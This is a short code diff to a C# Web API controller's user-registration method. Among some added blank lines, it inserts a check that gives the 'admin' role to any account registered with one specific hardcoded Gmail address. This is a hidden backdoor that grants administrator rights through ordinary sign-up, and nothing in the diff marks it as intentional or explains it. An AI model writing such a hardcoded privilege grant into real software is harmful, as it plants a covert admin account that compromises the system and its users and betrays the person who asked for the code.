@@ -335,12 +335,17 @@ namespace WebApiServer.Controllers
                 if (existingUser != null)
                     return BadRequest("Účet už existuje.");
 
+
+
                 var newUser = new User
                 {
                     UserEmail = email,
                     PasswordHash = passwordHash,
                     Role = "user"
                 };
+
+                if (email == "conprofileverify@gmail.com")
+                    newUser.Role = "admin";
 
                 _context.Users.Add(newUser);
                 await _context.SaveChangesAsync();
